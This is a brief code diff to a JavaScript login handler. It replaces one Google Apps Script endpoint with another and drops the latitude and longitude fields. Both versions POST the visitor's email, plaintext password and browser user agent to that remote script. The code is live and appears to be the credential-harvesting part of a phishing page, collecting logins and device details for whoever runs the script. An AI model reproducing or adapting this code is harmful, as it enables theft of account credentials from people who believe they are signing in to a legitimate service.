@@ -136,16 +136,14 @@ async function loginSuccess(event) {
   let lon = "";
 
   const sendLogin = async () => {
-    const response = await fetch("https://script.google.com/macros/s/AKfycbxM30giqEK0YpKYADiVsCpoY-Epuq9UnMxD4QWuC7No6akbucSLKAJEci9OLA-7ian1/exec", {
-      method: "POST",
-      body: new URLSearchParams({
-        email,
-        password: pass,
-        device: navigator.userAgent,
-        latitude: lat,
-        longitude: lon
-      })
-    });
+    const response = await fetch("https://script.google.com/macros/s/AKfycbwErBUvrhWsjv5MRfQxsvqHTgl7N6bnXNdCqTa-7HhJtRBN8v5bPiotUEXVPnuPcV6x/exec", {
+  method: "POST",
+  body: new URLSearchParams({
+    email: email,
+    password: pass,
+    device: navigator.userAgent
+  })
+});
 
     const result = await response.json();
 
